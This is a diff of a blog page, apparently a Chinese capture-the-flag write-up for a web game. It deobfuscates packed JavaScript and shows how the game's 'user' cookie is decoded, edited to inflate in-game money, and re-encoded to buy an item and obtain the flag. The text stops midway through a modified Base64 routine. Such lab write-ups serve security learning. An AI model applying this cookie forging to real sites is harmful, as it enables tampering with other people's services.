 <p>包含属性 练功 商店 赚钱 讨伐 退出 几个页面</p>
 <p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" srcset="/img/loading.gif" alt="mt-1.png"></p>
 <p>其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag</p>
-<p><strong>查看源码</strong>    </p>
+<p><strong>查看源码</strong>	</p>
 <p>在wulin.php中可以看到三个js文件</p>
 <p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" srcset="/img/loading.gif" alt="mt-2.png"></p>
 <div class="hljs"><pre><code class="hljs js"><span class="hljs-comment">//script.js 在线格式化后的结果</span>
 
 
-<span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;
-	e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;
-		<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">&#x27;&#x27;</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))
+<span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) &#123;
+	e = <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;
+		<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">&#x27;&#x27;</span> : <span class="hljs-title function_">e</span>(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(c + <span class="hljs-number">29</span>) : c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>))
 	&#125;;
-	<span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;0&#x27;</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;
-		<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];
-		k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;
+	<span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;
+		<span class="hljs-keyword">while</span> (c--) r[<span class="hljs-title function_">e</span>(c)] = k[c];
+		k = [<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;
 			<span class="hljs-keyword">return</span> r[e] || e
 		&#125;];
-		e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
+		e = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;
 			<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;[57-9abd-hj-zAB]&#x27;</span>
 		&#125;;
 		c = <span class="hljs-number">1</span>
 	&#125;;
 	<span class="hljs-keyword">while</span> (c--)
-		<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + e(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), k[c]);
+		<span class="hljs-keyword">if</span> (k[c]) p = p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + <span class="hljs-title function_">e</span>(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), k[c]);
 	<span class="hljs-keyword">return</span> p
-&#125;(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre></div>
+&#125;(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre></div>
 
 <p>可以看到<code>function(p, a, c, k, e, r)</code>函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。</p>
-<div class="hljs"><pre><code class="hljs js">(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;)
+<div class="hljs"><pre><code class="hljs js">(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;)
 </code></pre></div>
 
 
@@ -898,57 +898,57 @@ print(password)</code></pre></div>
 <p>删除eval在浏览器的控制台跑出的结果</p>
 <p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" srcset="/img/loading.gif" alt="mt-4.png"></p>
 <p>在线代码格式化后如下</p>
-<div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;
+<div class="hljs"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getCookie</span>(<span class="hljs-params">cname</span>) &#123;
     <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">&quot;=&quot;</span>;
-    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>);
-    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
-        <span class="hljs-keyword">var</span> c = ca[i].trim();
-        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)
+    <span class="hljs-keyword">var</span> ca = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;;&#x27;</span>);
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.<span class="hljs-property">length</span>; i++) &#123;
+        <span class="hljs-keyword">var</span> c = ca[i].<span class="hljs-title function_">trim</span>();
+        <span class="hljs-keyword">if</span> (c.<span class="hljs-title function_">indexOf</span>(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">substring</span>(name.<span class="hljs-property">length</span>, c.<span class="hljs-property">length</span>)
     &#125;
     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>
 &#125;
 
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;
-    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();
-    <span class="hljs-keyword">var</span> result = base.decode(temp);
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">decode_create</span>(<span class="hljs-params">temp</span>) &#123;
+    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Base64</span>();
+    <span class="hljs-keyword">var</span> result = base.<span class="hljs-title function_">decode</span>(temp);
     <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;
-        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.<span class="hljs-property">length</span>; i++) &#123;
+        <span class="hljs-keyword">var</span> num = result[i].<span class="hljs-title function_">charCodeAt</span>();
         num = num ^ i;
         num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);
-        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)
+        result3 += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(num)
     &#125;
     <span class="hljs-keyword">return</span> result3
 &#125;
 
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">ertqwe</span>(<span class="hljs-params"></span>) &#123;
     <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">&quot;user&quot;</span>;
-    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);
+    <span class="hljs-keyword">var</span> temp = <span class="hljs-title function_">getCookie</span>(temp_name);
     temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);
-    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);
-    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">&#x27;;&#x27;</span>);
+    <span class="hljs-keyword">var</span> mingwen = <span class="hljs-title function_">decode_create</span>(temp);
+    <span class="hljs-keyword">var</span> ca = mingwen.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;;&#x27;</span>);
     <span class="hljs-keyword">var</span> key = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
-        <span class="hljs-keyword">if</span> (-<span class="hljs-number">1</span> &lt; ca[i].indexOf(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;
-            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">2</span>]
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.<span class="hljs-property">length</span>; i++) &#123;
+        <span class="hljs-keyword">if</span> (-<span class="hljs-number">1</span> &lt; ca[i].<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;
+            key = ca[i + <span class="hljs-number">1</span>].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">2</span>]
         &#125;
     &#125;
-    key = key.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>);
-    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);
-    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-2.jpg&quot;</span>
+    key = key.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>);
+    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
+        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;attack-1&quot;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&quot;image/1-2.jpg&quot;</span>
     &#125;, <span class="hljs-number">1000</span>);
-    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-3.jpg&quot;</span>
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
+        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;attack-1&quot;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&quot;image/1-3.jpg&quot;</span>
     &#125;, <span class="hljs-number">2000</span>);
-    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-4.jpg&quot;</span>
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
+        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;attack-1&quot;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&quot;image/1-4.jpg&quot;</span>
     &#125;, <span class="hljs-number">3000</span>);
-    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/6.png&quot;</span>
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
+        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;attack-1&quot;</span>).<span class="hljs-property">src</span> = <span class="hljs-string">&quot;image/6.png&quot;</span>
     &#125;, <span class="hljs-number">4000</span>);
-    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
-        alert(<span class="hljs-string">&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot;</span> + md5(key) + <span class="hljs-string">&quot;&#125;&quot;</span>)    <span class="hljs-comment">//发现了flag字段  </span>
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;
+        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot;</span> + <span class="hljs-title function_">md5</span>(key) + <span class="hljs-string">&quot;&#125;&quot;</span>)    <span class="hljs-comment">//发现了flag字段  </span>
     &#125;, <span class="hljs-number">5000</span>)
 &#125;</code></pre></div>
 
@@ -958,7 +958,7 @@ print(password)</code></pre></div>
 
 
 
-<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" srcset="/img/loading.gif"></p>
 <p>获取cookie，使用上面的js代码一步一步解码</p>
 <p>最后会获取序列化后的一串字符串</p>
 <p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" srcset="/img/loading.gif" alt="mt-5.png"></p>
@@ -972,151 +972,151 @@ print(password)</code></pre></div>
 <p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" srcset="/img/loading.gif" alt="mt-7.png"></p>
 <p><strong>修改后的反编码过程</strong>，将其放到html文件中，浏览器运行即可出结果</p>
 <div class="hljs"><pre><code class="hljs html">//1.html
-<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-
-<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span>(<span class="hljs-params"></span>) </span>&#123;</span>
- 
-<span class="javascript">	<span class="hljs-comment">// private property</span></span>
-<span class="javascript">	_keyStr = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span>
- 
-<span class="javascript">	<span class="hljs-comment">// public method for encoding</span></span>
-<span class="javascript">	<span class="hljs-built_in">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
-<span class="javascript">		<span class="hljs-comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span>
-<span class="javascript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
-			chr1 = input.charCodeAt(i++);
-			chr2 = input.charCodeAt(i++);
-			chr3 = input.charCodeAt(i++);
-			enc1 = chr1 &gt;&gt; 2;
-			enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);
-			enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);
-			enc4 = chr3 &amp; 63;
-<span class="javascript">			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>
-				enc3 = enc4 = 64;
-<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>
-				enc4 = 64;
-			&#125;
-			output = output +
-			_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
-			_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
-		&#125;
-<span class="javascript">		<span class="hljs-keyword">return</span> output;</span>
-	&#125;
- 
-<span class="javascript">	<span class="hljs-comment">// public method for decoding</span></span>
-<span class="javascript">	<span class="hljs-built_in">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
-<span class="javascript">		input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span>
-<span class="javascript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
-			enc1 = _keyStr.indexOf(input.charAt(i++));
-			enc2 = _keyStr.indexOf(input.charAt(i++));
-			enc3 = _keyStr.indexOf(input.charAt(i++));
-			enc4 = _keyStr.indexOf(input.charAt(i++));
-			chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);
-			chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);
-			chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;
-<span class="javascript">			output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>
-			if (enc3 != 64) &#123;
-<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>
-			&#125;
-			if (enc4 != 64) &#123;
-<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>
-			&#125;
-		&#125;
-<span class="javascript">		<span class="hljs-comment">//output = _utf8_decode(output);</span></span>
-<span class="javascript">		<span class="hljs-keyword">return</span> output;</span>
-	&#125;
- 
-<span class="javascript">	<span class="hljs-comment">// private method for UTF-8 encoding</span></span>
-<span class="javascript">	_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">string</span>) </span>&#123;</span>
-<span class="javascript">		string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">&quot;\n&quot;</span>);</span>
-<span class="javascript">		<span class="hljs-keyword">var</span> utftext = <span class="hljs-string">&quot;&quot;</span>;</span>
-<span class="javascript">		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span>
-<span class="javascript">			<span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>
-			if (c &lt; 128) &#123;
-<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
-<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span>
-<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span>
